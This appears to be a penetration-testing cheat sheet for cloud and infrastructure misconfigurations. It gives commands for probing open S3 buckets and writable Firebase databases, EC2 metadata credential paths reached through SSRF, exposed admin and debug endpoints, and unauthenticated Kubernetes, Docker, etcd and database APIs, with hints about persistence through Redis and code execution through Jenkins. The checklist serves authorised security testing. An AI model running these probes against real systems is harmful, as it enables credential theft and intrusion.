# Cloud / Infra Misconfigs

## S3 / GCS / Azure Blob
```bash
# S3 listing
curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

## EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

## Exposed Admin Panels & Debug Endpoints
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
/actuator/health  /actuator/env  /actuator/heapdump  /actuator/mappings
/_debug  /__debug__  /console  /telescope  /horizon
/wp-json/wp/v2/users  /_profiler/  /debug/vars  /debug/pprof/
```

## Kubernetes / Container
```bash
# Kubelet API (port 10250/10255)
curl -k https://target:10250/pods
curl -k https://target:10255/metrics

# Docker API (port 2375/2376)
curl http://target:2375/containers/json
curl http://target:2375/version

# etcd (port 2379)
curl http://target:2379/v2/keys/
```

## Database Exposure
```bash
# Redis (6379)
redis-cli -h target -p 6379 info
# Check: CONFIG GET dir → if writable, write SSH key / cron

# MongoDB (27017)
mongo target:27017 --eval "db.getCollectionNames()"

# Elasticsearch (9200)
curl target:9200/_cat/indices?v
curl target:9200/_cluster/health
```

## CI/CD Exposure
```bash
# GitLab / GitHub / Bitbucket runners
# Check for exposed .gitlab-ci.yml, GitHub Actions workflows with secrets

# Jenkins script console
# /script → Groovy script execution = RCE
```

## Testing Checklist
```
[ ] Check all subdomains for S3/GCS/Azure blob misconfig
[ ] Test SSRF → cloud metadata (if SSRF found)
[ ] Scan for exposed admin panels on all ports
[ ] Check Kubernetes/Docker APIs
[ ] Check database ports (Redis, Mongo, ES, PostgreSQL, MySQL)
[ ] Check CI/CD endpoints
[ ] Check Firebase / Supabase / AppSync open rules
```